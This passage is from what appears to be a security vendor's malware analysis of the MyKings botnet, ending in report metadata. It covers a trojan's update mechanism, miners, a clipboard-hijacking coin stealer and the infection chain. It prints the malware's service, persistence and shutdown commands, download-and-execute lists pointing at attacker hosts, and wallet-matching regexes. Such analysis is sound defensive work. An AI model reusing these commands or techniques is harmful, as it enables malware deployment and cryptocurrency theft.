from the current download servers.\n\nThe content of the file is an IP address like:\n```\n  66.117.6.174\n\n```\nAfter that downloads two files from this IP address, update.txt and ver.txt.\n\n_ver.txt contains the version number, which for the latest analyzed case was 1.0.0.9, other common_\nversion numbers were 1.0.0.1 and 1.0.0.8\n\nThe content of the file is update.txt is:\n```\nhxxp://66.117.6[.]174/wpd.jpg c:\\windows\\system\\msinfo.exe\nhxxp://66.117.6[.]174/my1.html c:\\windows\\system\\my1.bat\n\n```\n_msinfo.exe is the SQL brute forcing application, which will be registered as a service with the command:_\n\n```\nconfig xWinWpdSrv binpath= \"c:\\windows\\system\\msinfo.exe -s -syn\n\n```\n\nThis command line starts the tool in network discovery mode, it will perform a mass port scan on the\nlocal network.\n\nThen starts the service with the command\n```\n/c sc start xWinWpdSrv&ping 127.0.0.1 -n 10 && del \n\n```\n**Dloadr**\n\nThese are Nullsoft Installer archives. They don't contain embedded malicious components, only the\nmalicious installation script is executed which downloads and installs the further components.\n\nTypically, they download three further components, as in the following example:\n\n  - buff2.dat: the coin stealer\n\n  - VID.dat: xmrig cryptominer\n\n  - dhelper.dat: Neksminer cryptominer\n\n\n33\n\n\n-----\n\nAll three components are delivered in password protected WinRAR SFX archives, and the NSIS installer\nscript provides the required password, as highlighted on the previous picture.\n\n**Forshare**\n\nThis Trojan is the most common payload delivered to the infected computers.\n\nThe version information of the executables usually contains Chinese text:\n\nTranslation:\n```\n  CompanyName: TODO: <company name>\n  FileDescription: TODO: <file description>\n  ProductName: TODO: <product name>\n\n```\n34\n\n\n-----\n\nNot a very creative way to leave these fields at default “fill in the blanks” values. These are the values in\nall variants, except the FileVersion/ProductVersion which was 1.0.0.1 in the older versions and 1.0.0.9 in\nthe latest ones. This value is used as version information when checking for updates.\n\nThe Trojan behaves in many ways like a “normal” application, even provides a simple help:\n\nSome variants of the backdoor are debug built and display status messages on the console during\nexecution.\n\nThe undocumented -g command line switch provided a more verbose logging:\n\nThe samples contain an internal version information. This has nothing to do with the version number\nused in the updating process.\n\nThe values that we found in samples are:\n```\n  ups2 V1.0.1\n  ups2 V1.0.2\n\n```\n35\n\n\n-----\n\nMany of the samples are debug built that contain source file name information. Most of the samples\nalso contain PDB path. These are the observed values (the first being the most common used by both\nv1.0.1 and v1.0.2):\n```\n  D:\\ups new2\\Release\\ups.pdb\n  G:\\Document\\SYN HYDRA\\ups-new2\\Release\\ups.pdb\n\n```\nThe samples contain the following hardcoded RSA public key:\n```\n  -----BEGIN RSA PUBLIC KEY----  MIGJAoGBAMrexeviSRCFYvplOhEC6wLL0qtv3CdsNThO/TZCP+bhtDakW3nN3I+Z\n  qRip7vroYKKKGHKgougCnKISLqWibkjyAlr/UIDtQ9KnfDSu9CMTXrRMGpGB5otL\n  qLhSKESWhUlCB8Iqqxu8jL/MtzibB8s/K0tQqvsf/YyWMynIULqVAgMBAAE=\n  -----END RSA PUBLIC KEY----\n```\n[This key is used to decrypt the content of the xpdown.dat file and other](https://securitynews.sonicwall.com/xmlpost/new-variant-pcshare-trojan-with-ups2-version-1-0-2-server-dec-2018/) config files.\n\nThe key is used at the start of execution to decrypt some data. If the decryption is not successful, an\nerror message is logged to the console.\n\nWe observed this in one case where the executable (SHA1:\ne1ff22fbd57687a349602fc7705ec5f53c627b54) contained a different RSA key, thus generating the error\nmessage above. This may have happened by mistake; this second key was not used in any other sample\nwe analyzed.\n\nThe Trojan uses a mutex to ensure that it is only running a single instance. We found the following\nmutex values in the analyzed samples:\n```\n  {25BA86C7-2583-4825-AB16-A5031FA1C22D}\n  {30BA86C7-2583-4825-BC16-A5031FA1C22D}\n\n```\nIf finds an already running instance, drops an error message and exits.\n```\n2019.09.13 06:54:43:798 Thread: [2688] [2282] FirstInstance failed\n\n```\nThe Trojan can be executed as a service (with the -r command line switch). In this case it will register as\na service with the name “Windows Audio Control”\n\n36\n\n\n-----\n\nThe service will be executed with the net start Windows Audio Control command.\n\nThe Trojan contains a hardcoded download server list that it will use, for example:\n```\n  45.58.135.106\n  103.95.28.54\n  103.213.246.23\n  74.222.14.61\n  ok.mymyxmra.ru\n\n```\nThis list is saved to the file C:\\Program Files\\Common Files\\xpdown.dat.\n\nLater Forshare downloads xpdown.dat form the specified server list, decrypts the content, and saves it\nover the same location, which will now contain the updated server list in decrypted form.\n\nChecks the internet connectivity by attempting to load the website http://www.amazon.com. If it is\nsuccessful, proceeds with downloading ver.txt from the servers in the download server list. This is a text\nfile that only contains the version information, which was the following at the time of our analysis:\n```\n  1.0.0.8\n\n```\nIf it matches the ProductVersion info from the PE file, then nothing happens, otherwise an update is\ndownloaded.\n\nGoes through the server list and attempts to download up.rar from the server. It serves as an update for\nthe Trojan.\n```\n  2019.09.13 07:49:27:749 Thread: [2644] [1434] check version begin\n  2019.09.13 07:49:32:667 Thread: [2644] [1441] access amazon success\n  2019.09.13 07:49:32:707 Thread: [2644] [1463] ver different web:1.0.0.8 local:,\n  needs update.\n  2019.09.13 07:49:32:747 Thread: [2644] [1551] download up.rar failed,continue...\n\n```\nIf an update could be found, stops the running process and executes the downloaded update with the -C\n_create -r command line:_\n```\n/C ping 127.0.0.1 -n 6 & taskkill -f /im conime.exe /im ups2.exe & copy /Y \"%s\" \"%s\" & \"%s\" -C\ncreate -r\n\n```\nHere the strings are filled in with the downloaded new version's path and filename. Interestingly, it also\nstops the conime.exe process – possibly another process name sometimes used by the Trojan.\n```\n  2019.09.13 07:02:57:857 Thread: [1832] [72] cService::Create Calling:\n  C:\\temp\\ups2.exe -s\n  2019.09.13 07:02:57:927 Thread: [1832] [2595] Command [created] Executing\n  2019.09.13 07:03:27:960 Thread: [1832] [211] StartService failed,Error: 1053\n  2019.09.13 07:03:27:960 Thread: [1832] [2601] Service Start Failed£¬Return\n  Value: 0x0000041D\n\n```\nThe service waits for commands. The possible commands are:\n```\n  CONTROL_STOP\n  CONTROL_PAUSE\n  CONTROL_CONTINUE\n  CONTROL_INTERROGATE\n  CONTROL_SHUTDOWN\n\n```\nThe Trojan starts a new thread that does the download of further components. This update mechanism,\nusing the kill list and download list files is shared with other components of the MyKings botnet, for\nexample the SQL brute forcing tool, the DNSChanger Trojan and some of the miner versions do the\nsame.\n\n37\n\n\n-----\n\nThis thread runs the update process every two hours.\n```\n2019.09.13 04:51:08:700 Thread: [3492] [2334] next check time is two hours\n\n```\nIt attempts to download /ok/down.html from all of the servers in xpdown.dat. The content of this file is\nthe address of the current download server.\n\nDownloads kill.txt from the server. This contains a kill list of executables that need to be removed:\n```\n  lsmose.exe,C:\\Windows\\debug\\lsmose.exe,0\n  lsmos.exe,C:\\Windows\\debug\\lsmos.exe,1\n  lsmo.exe,C:\\Windows\\debug\\lsmo.exe,1\n  conime.exe,C:\\Program Files (x86)\\Common Files\\conime.exe,1\n  lsmosee.exe,c:\\windows\\help\\lsmosee.exe,1\n  severxxs.exe,C:\\Windows\\Temp\\severxxs.exe,1\n  mssecsvc.exe,c:\\windows\\mssecsvc.exe,1\n  mssecsvr.exe,c:\\windows\\mssecsvr.exe,1\n  dsbws.exe,c:\\windows\\syswow64\\dsbws.exe,1\n\n```\nEach entry has the process name, the file path and a flag that indicates whether the process itself has to\nbe stopped. This is handled by the Trojan accordingly:\n```\n  2019.09.13 06:35:16:500 Thread: [3512] [1551] no need kill proc:\n  lsmose.exe,file: C:\\Windows\\debug\\lsmose.exe\n  2019.09.13 06:35:16:500 Thread: [3512] [1551] need kill proc: lsmos.exe,file:\n  C:\\Windows\\debug\\lsmos.exe\n  2019.09.13 06:35:16:500 Thread: [3512] [1551] need kill proc: lsmo.exe,file:\n  C:\\Windows\\debug\\lsmo.exe\n  2019.09.13 06:35:16:500 Thread: [3512] [1551] need kill proc: conime.exe,file:\n  C:\\Program Files (x86)\\Common Files\\conime.exe\n  2019.09.13 06:35:16:500 Thread: [3512] [1569] delete C:\\Program Files\n  (x86)\\Common Files\\conime.exe failed,dwRet: 2\n  2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: lsmosee.exe,file:\n  c:\\windows\\help\\lsmosee.exe\n  2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: severxxs.exe,file:\n  C:\\Windows\\Temp\\severxxs.exe\n  2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: mssecsvc.exe,file:\n  c:\\windows\\mssecsvc.exe\n  2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: mssecsvr.exe,file:\n  c:\\windows\\mssecsvr.exe\n  2019.09.13 06:35:21:507 Thread: [3512] [1551] need kill proc: dsbws.exe,file:\n  c:\\windows\\syswow64\\dsbws.exe\n  2019.09.13 06:35:21:507 Thread: [3512] [1569] delete\n  c:\\windows\\syswow64\\dsbws.exe failed,dwRet: 2\n\n```\nThen downloads down.txt form the server (some versions use additionally downs.txt as well). It contains\nthe list of additional modules:\n```\n  hxxp://185.112.156[.]92/down.exe C:\\windows\\system\\down.exe 0\n  hxxp://174.128.249[.]18/item.rar C:\\windows\\debug\\item.dat 0\n  hxxp://150.107.76[.]231/2.exe c:\\windows\\inf\\msiefs.exe 1\n  hxxp://174.128.249[.]18/64work.rar c:\\windows\\inf\\lsmm.exe 1\n\n```\nThe entries contain the URL, the local file name where it has to be saved and a flag to indicate whether\nit should be executed.\n\nThe Trojan then processes this list.\n```\n  2019.09.13 06:35:26:544 Thread: [3512] [1949] no need execute url:\n  http://185.112.156[.]92/downs.exe,file: C:\\windows\\system\\downs.exe\n  2019.09.13 06:35:26:594 Thread: [3512] [1954] http download\n  hxxp://185.112.156[.]92/downs.exe failed\n  2019.09.13 06:35:26:594 Thread: [3512] [1949] no need execute url:\n\n```\n38\n\n\n-----\n\n```\n  hxxp://174.128.249[.]18/item.rar,file: C:\\windows\\debug\\item.dat\n  2019.09.13 06:35:30:209 Thread: [3512] [1954] http download\n  hxxp://174.128.249[.]18/item.rar success\n  2019.09.13 06:35:30:209 Thread: [3512] [1949] need execute url:\n  hxxp://150.107.76[.]231/2.exe,file: c:\\windows\\inf\\msiefs.exe\n  2019.09.13 06:35:31:0 Thread: [3512] [1954] http download\n  hxxp://150.107.76[.]231/2.exe failed\n\n```\nSome of the Forshare versions contain additional code specific to download miners and their\ndependencies.\n\nThose access vers1.txt that has the typical content:\n```\n64.rar 5.1.2600.5512 (xpsp.080413-2105)\n\n```\nDownloads the file to one of the following locations:\n```\n  c:\\windows\\system32\\drivers\\64.exe\n  c:\\windows\\debug\\lsmose.exe\n\n```\nThe following dependencies (XMR miner related DLLs) are also downloaded from the server:\n```\n  xmrstak_cuda_backend.dll\n  xmrstak_opencl_backend.dll\n  pthreadVC2.dll\n  cudart32_65.dll\n\n```\nWithout these DLLs the miner could not work.\n\n**Miners**\n\nThe main point of building up the MyKings botnet was to deliver Monero coin miners to the infected\ncomputers. During the lifetime of the botnet several different miner programs were used and a handful\nof different wallets were collecting the crypto currency.\n\n[Some of the miners are based on the ccminer project](https://github.com/tsiv/ccminer-cryptonight) and require the additional download of\ncudart32_65.dll and pthreadVC2.dll:\n\nThese miners may contain the PDB path:\n```\n  D:\\src\\cn\\Release\\ccminer.pdb\n\n```\nThese were most likely executed with the appropriate command line switches to connect to the mining\nserver:\n```\n   -O, --userpass=U:P  username:password pair for mining server\\n\\\n   -u, --user=USERNAME  username for mining server\\n\\\n   -p, --pass=PASSWORD  password for mining server\\n\\\n\n```\nThese miners were named downloaded with the file name cc.rar by some of the Forshare variants.\n\n39\n\n\n-----\n\n[The largest group miners are based on the xmr-stak project.](https://github.com/fireice-uk/xmr-stak)\n\nThese require the download of additional dlls:\n```\n  cudart32_65.dll\n  pthreadVC2.dll\n  xmrstak_cuda_backend.dll\n  xmrstak_opencl_backend.dll\n\n```\nThese were typically downloaded along with the miners during the installation phase. Or, in other cases,\nthe miner was packaged into a self-extracting RAR archive along with the dependencies, set to execute\nthe miner automatically on unpacking:\n\nThis miner requires the presence of at least two CPUs in the system. It is a common anti-emulation trick\nby malware to check the number of processors, but in this case, the purpose is not for evading analysis,\nbut for ensuring that there is enough computing power to consume.\n```\n  ------------------------------------------------------------------  XMR mining software, CPU-GPU Version.\n  You can use following keys to display reports:\n  'h' - hashrate\n  'r' - results\n  'c' - connection\n  ------------------------------------------------------------------  cpu is less than 2, exit\n\n```\nThis additional check is not present in the original source code of xmr-stak, could be an addition by the\nthreat actors who used the publicly available source of this miner and made numerous enhancements\nto it, to implement additional required functionality, like the updating process.\n\nThe xmr-stak based miners contain and use the same RSA key as the Forshare variants to decrypt the\nconfig data.\n\nThe miners also contain a similar server list as the Forshare Trojan, for example:\n```\n  xmr.xmr5b.ru\n  45.58.135.106\n  103.213.246.23\n  103.95.28.54\n\n```\n40\n\n\n-----\n\n```\n  74.222.14.97\n  ok.mymyxmra.ru\n  54.255.141.50\n\n```\nMany of the variants contain a PDB path. The observed values were:\n```\n  D:\\chighserver-xmr 20180311\\Release\\xmr.pdb\n  F:\\chighserver-xmr\\Release\\xmr.pdb\n  H:\\chighserver-xmr\\Release\\xmr.pdb\n  E:\\open sources\\xmrok\\修改域名\\chighserver-xmr\\Release\\xmr.pdb\n\n```\nThe translation of the Chinese text in the latter is: “Modify the domain name”.\n\nWe have seen the following wallet ID to collect the mined coins:\n```\n  47Tscy1QuJn1fxHiBRjWFtgHmvqkW71YZCQL33LeunfH4rsGEHx5UGTPdfXNJtMMATMz8bmaykGVuDFG\n  WP3KyufBSdzxBb2\n\n```\nAnother large group were the xmrig miners. These are typically delivered in NSIS self-installing archives,\nthat contains both the 32- and 64-bit versions of the miner:\n\nThen the script executes the miner executable, feeding the criminal's wallet ID as a command line\nparameter:\n\nThe latest in the long line of miner variations, the one that at the time of writing this paper is currently\nused, are 64-bit xmrig variant.\n\n41\n\n\n-----\n\nVersion: (the version numbers in the PE properties are different from the version info in the source):\n```\n  XMRig 2.14.1\n   built on Mar 9 2019 with MSVC\n   features: 64-bit AES\n\n```\nMiner info:\n```\n        \"url\": \"sg.minexmr.com:3333\",\n        \"user\":\n  \"431rnEmM7kRhQZpUg1BcUqJYZv3PFMm72D1nNVPD6KguSadJbaq2H1QgCPgfb4ioxQas2Dy7ea7rsa8\n  gUCkkdvQGTZYE5tZ\",\n        \"pass\": \"x\",\n\n```\nThis account has been suspended for botnet activity (this usually happens with all of the wallet IDs used\nby the botnet):\n\nHowever, this account was transferred to a different server, where it is (at the time of writing this\npaper) still active, and has collected about 200 XMR (US$10,400):\n\nThis account is the currently known, latest active wallet used by the MyKings botnet.\n\n**CoinStealer**\n\nOne of the less common payloads is a coin stealer Trojan.\n\nOn execution it checks for the mutex to avoid multiple executions:\n```\n  Windows 7 Professional02\n\n```\nAnd then it contacts two URLs. The first address is hxxp://2no[.]co/1Lan77, redirecting\nto hxxps://iplogger[.]org/1Lan77. The purpose is likely to track infections.\n\nThe second contacted URL is hxxp://ioad[.]pw/ioad.exe which points to an NSIS downloader, just like\nthe ones described in the Dloadr section.\n\nThe stealer uses several regular expressions that match wallet addresses for a wide selection of\ncryptocurrencies:\n\n42\n\n\n-----\n\n```\n  ^[13][a-zA-Z0-9]{99,99}$ - Bitcoin\n  ^B[a-zA-Z0-9]{32,36}$ - BlackCoin\n  ^[13][a-zA-Z0-9]{26,33}$ - Bitcoin, ByteCoin\n  ^E[a-zA-Z0-9]{32,36}$ - EmerCoin\n  ^q[a-zA-Z0-9]{40,42}$ - Bitcoincash\n  ^R[a-zA-Z0-9]{32,36}$ - ReddCoin\n  ^r[a-zA-Z0-9]{32,36}$ - Ripple\n  ^A[a-zA-Z0-9]{29,40}$ - Neo\n  ^[0][x][a-zA-Z0-9]{25,45}$ - Ethereum, Electroneum\n  ^[Xx][a-zA-Z0-9]{25,50}$ - Dash\n  ^[Dd][a-zA-Z0-9]{25,45}$ - Dogecoin\n  ^[0][x][a-zA-Z0-9]{99,99}$ - Ethereum\n  ^L[a-zA-Z0-9]{26,33}$ - Litecoin\n  ^[4][a-zA-Z0-9]{80,130}$ - XMR\n  ^[tzTZ][a-zA-Z0-9]{25,45}$ - Zcash\n  ^[R][0-9]{12,15}$ - WMR\n  ^[U][0-9]{12,15}$ - WMU\n  ^[X][0-9]{12,15}$ - WMX\n  ^[G][0-9]{12,15}$\n  ^[E][0-9]{12,15}$ - WME\n  ^[Z][0-9]{12,15}$ - WMZ\n  ^Y[a-zA-Z0-9]{89,92}$ - Miota\n  ^D[a-zA-Z0-9]{103,105}$ - Cardano\n  ^[0-9]{19,22}L$ - Lisk\n  ^S[a-zA-Z0-9]{31,35}$ - Stratis\n  ^3P[a-zA-Z0-9]{32,36}$ - Waves\n  ^Q[a-zA-Z0-9]{32,36}$ - Qtum, ReddCoin\n  ^G[a-zA-Z0-9]{54,57}$ - Stellar\n  ^V[a-zA-Z0-9]{32,36}$ - Viacoin\n  G[a-zA-Z0-9]{104,107}$ - Graft\n  ^41991[a-zA-Z0-9]{7,12}$ - YaMoney\n\n```\nAnd some other search expressions matching web services like Google, Steam, Vkontakte (a popular\nsocial media site in Russia):\n```\n  ((https://yad))+(([a-zA-Z0-9.-]+.[a-zA-Z]{2,4})|([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}))(/[a-zA-Z0-9%:/\n```\n_?.'~]*)? - yadisc\n```\n  ((https://steamcommunit))(?!.*id|.*id)(([a-zA-Z0-9.-]+.[a-zA-Z]{2,4})|([0  9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}))(/[a-zA-Z0-9%:/-_?.'~&]*)?\n  ^(https://goo.gl/)([a-zA-Z0-9]{0,50})?\n  ^(https://vk.cc/)([a-zA-Z0-9]{0,50})?\n\n```\nAdditionally the Trojan keeps a list of wallet addresses most likely belonging to the criminals. The XMR\nwallet ID\n(41xDYg86Zug9dwbJ3ysuyWMF7R6Un2Ko84TNfiCW7xghhbKZV6jh8Q7hJoncnLayLVDwpzbPQPi62bvPqe\n_6jJouHAsGNkg2) was used in the Photominer campaigns, we think that the others could belong to the_\nMyKings botnet as well. The list of own wallet IDs is the following:\n\n**Currency** **Wallet**\n\nBitcoincash `[qrfdnklvpgmh94dycdsp68qd6nf9fk8vlsr24n2mcp]`\n\nByteCoin `12cZKjNqqxcFovghD5N7fgPNMLFZeLZc3u`\n\nEmerCoin `EVRzjX4wpeb9Ys6i1LFcZyTkEQvV9Eo2Wk`\n\nBlackCoin `JDi6PaWXd3yQ167tqShDxZcLEx3aRRSii`\n\nReddCoin `QrKfx3qsqaMQUVHx8yAd1aTHHRdjP6Tg`\n\n43\n\n|Currency|Wallet|\n|---|---|\n|Bitcoincash|qrfdnklvpgmh94dycdsp68qd6nf9fk8vlsr24n2mcp|\n|ByteCoin|12cZKjNqqxcFovghD5N7fgPNMLFZeLZc3u|\n|EmerCoin|EVRzjX4wpeb9Ys6i1LFcZyTkEQvV9Eo2Wk|\n|BlackCoin|JDi6PaWXd3yQ167tqShDxZcLEx3aRRSii|\n|ReddCoin|QrKfx3qsqaMQUVHx8yAd1aTHHRdjP6Tg|\n\n\n-----\n\n|Currency|Wallet|\n|---|---|\n|Ripple|rNoeET6PH5dkf1VVvuUc2eZYap9yDZiKTm|\n|Dash|Xup4gBGLZLDi9J9VbcLuRHGKDXaUjwMoZV|\n|Dogecoin|D6nziu2uAoiWvdjRYRPH7kedgzh56Xkjjv|\n|Ethereum|0x039fd537a61e4a7f28e43740fe29ac84443366f6|\n|Litecoin|LUfdGb4pCzTAq9wucRpZZgCF69QHpAgvfE|\n|XMR|41xDYg86Zug9dwbJ3ysuyWMF7R6Un2Ko84TNfiCW7xghhbKZV6jh8Q7hJoncnLayLVDwpzbPQPi62bvPqe6 jJouHAsGNkg2|\n|Zcash|t1JjREG9k58srT42KitRp3GyMBm2x4B889o|\n|Ethereum|0x6a1A2C1081310a237Cd328B5d7e702CB80Bd2078|\n|Iota|SVEBXIOJELVYBRULCLMQUYFHCPNJ9TWRDMFWMEDBEOQRO9MBO9VXMXYEBV9NUVFGGQDRDFUSKOQHOYFBWGX DKTGSDB|\n|Cardano|DdzFFzCqrht9wkicvUx4Hc4W9gjCbx1sjsWAie5zLHo2K2R42y2zvA7W9S9dM9bCHE7xtpNriy1EpE5xwv7 mPuSjhP4FyB9Z1ra6Ge3y|\n|Lisk|7117094708328086084L|\n|Stratis|SPLfNnmUdqmYu1FH2qMcGiU7P8Mwf9Z3Kr|\n|Waves|3PAFMSCjWpf5WDxkkECMmwqkZGHySgpuzEo|\n|Qtum|QNkbMtCmWSCFS1U63PcAxhKufLvEwSsJ8t|\n|Stellar|GBJOA4BNCXBSYG3ZVU2GXNOOA2JJLCG4JIVNEINHQIZNVMX4SSH5LLK7|\n|Viacoin|VhGTEsM6ewqNBJwDEB2o6bHvRqFdGqu5HM|\n|Graft|G4qyAXyftgpRW4idTMWA7e7QnSN6DKUeGcbcqAQra3c46JRuYdzTRxwVAGYRCK9U5WLncok7Loni73sm1Ta WhbQ1DnAJKx5|\n|Neo|AKY1itrWtsmziQhg2THDcR3oJhXsVLRxM7|\n\n\nThe malware examines the clipboard content using these regexes every 600 milliseconds. If the content\nmatches one of the recognized coin wallet formats, the malware changes the value in the clipboard to\nthe stored own wallet ID, generating an internal message:\n```\n|EmerCoin| Changed: EVRzjX4wpeb9Ys6i1LFcZyTkEQvV9Eo2Wl | to:\nEVRzjX4wpeb9Ys6i1LFcZyTkEQvV9Eo2Wk\n\n```\nThis message is set as user agent in a subsequent InternetOpenA call. The code suggests that the\nintention was to submit this data to a server, but the server name was left empty in the variants known\nto us.\n\nThis method relies on the practice that most (if not all) people don't type in the long wallet IDs rather\nstore it somewhere and use the clipboard to copy it when they need it. Thus, when they would initiate a\npayment to a wallet, and copy the address to the clipboard, the Trojan quickly replaces it with the\ncriminals' own wallet, and the payment is diverted to their account.\n\nThe same is supposed to happen with goo.gl and vk.cc addresses, but in those cases the replacement\naddress is not defined, so it is not clear what is the intent of those searches.\n\nThe Trojan periodically searches all of the window texts belonging to running program using two lists.\nThe first contains system monitoring utilities:\n\n```\nNetMonitor\n\n```\n\n44\n\n\n-----\n\n```\n  taskmgr.exe\n  Process Killer\n  KillProcess\n  System Explorer\n  Process Explorer\n  AnVir\n  Process Hacker\n  Task Manager\n  Диспетчер\n\n```\n(The last element of the list corresponds to the Task Manager in Russian localized Windows versions.\n\nThe second list consists of debuggers:\n```\n  OllyDbg\n  IDA\n  ImmunityDebugger\n  Dbg\n  LordPE\n\n```\nIf any of them is found running, the Trojan creates a task that is executed every minute and shuts down\nthe computer:\n\n```\n/create /sc minute /tn \"7king hacker suck\" /tr \"cmd.exe /c shutdown -s -t 0\n\n```\n\nTo establish persistence the coin stealer registers itself as a scheduled task with a command line\n(directory name is random):\n```\n   /create /sc minute /f /tn \"Microsoft LocalManager[Windows 7 Professional]\" /tr\n  \"C:\\ProgramData\\{70800304-7080-7080-708003041534}\\lsm.exe\", show_window =\n  SW_HIDE\n\n```\nCurrently the coin addresses are not used or never received more than a few dollars, coin stealing\ndoesn't look like the most profitable operation of MyKings.\n\n### Full-fledged infection\n\nAs an illustration, we present a case with all major components of an infected system. Usually static\nanalysis of the malicious components can only establish indirect proof that the components belong to\nthe same attack chain. On the other hand, if we can observe the components within the same process\nchain, then it is a conclusive proof of them being connected.\n\n\n45\n\n\n-----\n\n##### 1: Root cause: PowerShell script\n\nThis code was inserted by the initial infection process, by one of the infection vectors.\n\nThe encrypted PowerShell command performs the update procedure, downloads and executed the\nsubsequent components.\n\n##### 2. Forshare backdoor\n\nThis was downloaded by the PowerShell script. The Trojan then reaches out and downloads several\ncomponents.\n\n\n46\n\n\n-----\n\n##### 3. WinRAR SFX dropper\n\nOne of the components downloaded by Forshare is the WinRAR SFX dropper, that drops c3.bat and the\nn.vbs that executes it.\n\n##### 4. c3.bat\n\nc3.bat nails down the infection process spawning several subprocesses to perform the installation and\ncleanup steps. In this particular case only a handful of these processes is visible, most likely because the\nprocess tree was killed before all of the operations could take place.\n\n47\n\n\n-----\n\n##### 5. xmrig miner\n\nAnother component downloaded and executed by the Forshare Trojan is an xmrig miner that is\nexecuted and starts making money for the criminals.\n\n##### 6. bootkit installer\n\nThe PowerShell script downloads and executes the bootkit installer. This writes out the IPL to\n\\device\\harddisk0\\dr0\n\n##### 7. DNSChanger\n\nThe PowerShell script downloads and executes the DNSChanger Trojan. This reaches out and downloads\nfurther components.\n\n48\n\n\n-----\n\n##### 8. SQL brute forcer\n\nThe DNSChanger Trojan downloads the main spreader component, the SQL brute forcer. This downloads\nthe config file and starts mapping the local network.\n\n##### 9. EternalBlue spreader\n\nIf the configuration specifies so, the SQL brute forcer component will download and execute the\nEternalBlue spreader which attempts to exploit the nearby computers.\n\n### Server infrastructure\n\nOver the years the MyKings botnet used several dozen server locations to host the malicious files. In the\n[early activities, for example the Photominer campaign, they used .ru domains. Later moved on to .pw,](https://www.guardicore.com/2016/06/the-photominer-campaign)\n.info, .club, .com domains, or even just referring to servers by IP addresses.\n\nThe servers are fresh installs, they show the default Microsoft IIS welcome page only.\n\nEither this:\n\n49\n\n\n-----\n\nor this :\n\n### Follow the money\n\n[According to a previous report the older addresses collected a large amount of Monero in the past:](https://blog.netlab.360.com/mykings-the-botnet-behind-multiple-active-spreading-botnets/)\n```\n47Tscy1QuJn1fxHiBRjWFtgHmvqkW71YZCQL33LeunfH4rsGEHx5UGTPdfXNJtMMATMz8bmaykGVuDFGWP3\n  KyufBSdzxBb2 --> Total Paid: 2000+ xmr\n45bbP2muiJHD8Fd5tZyPAfC2RsajyEcsRVVMZ7Tm5qJjdTMprexz6yQ5DVQ1BbmjkMYm9nMid2QSbiGLvvf\n  au7At5V18FzQ --> Total Paid: 6000+ xmr\n\n```\nBased on the Monero price in 2018 it was estimated to be about 3 million USD in total.\n\n[According to a recent article the suspended xmrig account](https://s.tencent.com/research/report/765.html)\n(455WeUnLXMi2ScZ7WLb9apVTWLe98f6zjR9Sys78txuVckB5cwsNjQyXiV9oTUXj1s93aDVWcTh2dMuMbb\n_T5abe715dNSR2) had 1077 XMR (on 2019-07-29), which was about 83,358 USD at that time._\n\nThe best days of Monero were in 2018, this could be considered the prime of the MyKings botnet.\nNowadays that activity of the botnet has not decreased, however due to the drop in the exchange rate\nthe profitability is much less.\n\n50\n\n\n-----\n\nCurrently the miners use the address\n_448FWFsUhMdhhnGo3Yw7N547dg2XyLPXEWvMZEC4yCVMYLxBAZbLzVwLvSAZJKsWYgLCm4cB2q8Vjg1Y_\n_wKkcDUYyAGgQmuR._\n\nAccording to supportxmr.com the content of this wallet is:\n\nWe estimate the daily amount of mined crypto currency is nearly 5 XMR (US$300).\n\n51\n\n\n-----\n\n_1 Earnings by the MyKings botnet over a 1-month period at the end of 2019 show slow but steady growth_\n_despite lower value for cryptocurrency_\n\n52\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.12.16.MyKings/sophoslabs-uncut-mykings-report.pdf"
    ],
    "report_names": [
        "sophoslabs-uncut-mykings-report"
    ],
    "threat_actors": [
        {
            "id": "d4f7cf97-9c98-409c-8b95-b80d14c576a5",
            "created_at": "2022-10-25T16:07:24.561104Z",
            "updated_at": "2025-03-27T02:02:10.281202Z",
            "deleted_at": null,
            "main_name": "Shadow Brokers",
            "aliases": [],
            "source_name": "ETDA:Shadow Brokers",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "171b85f2-8f6f-46c0-92e0-c591f61ea167",
            "created_at": "2023-01-06T13:46:38.830188Z",
            "updated_at": "2025-03-27T02:00:02.929729Z",
            "deleted_at": null,
            "main_name": "The Shadow Brokers",
            "aliases": [
                "Shadow Brokers",
                "ShadowBrokers",
                "The ShadowBrokers",
                "TSB"
            ],
            "source_name": "MISPGALAXY:The Shadow Brokers",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
            "created_at": "2023-01-06T13:46:38.376868Z",
            "updated_at": "2025-03-27T02:00:02.818071Z",
            "deleted_at": null,
            "main_name": "Cleaver",
            "aliases": [
                "Cobalt Gypsy",
                "G0003",
                "Operation Cleaver",
                "Op Cleaver",
                "Tarh Andishan",
                "Alibaba",
                "TG-2889"
            ],
            "source_name": "MISPGALAXY:Cleaver",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716505,
    "ts_updated_at": 1743041674,
    "ts_creation_date": 1576677303,
    "ts_modification_date": 1576677303,
    "files": {
        "pdf": "https://archive.orkl.eu/58b815814e28d00219c6b4dec546c23c6a6f2162.pdf",
        "text": "https://archive.orkl.eu/58b815814e28d00219c6b4dec546c23c6a6f2162.txt",
        "img": "https://archive.orkl.eu/58b815814e28d00219c6b4dec546c23c6a6f2162.jpg"
    }
}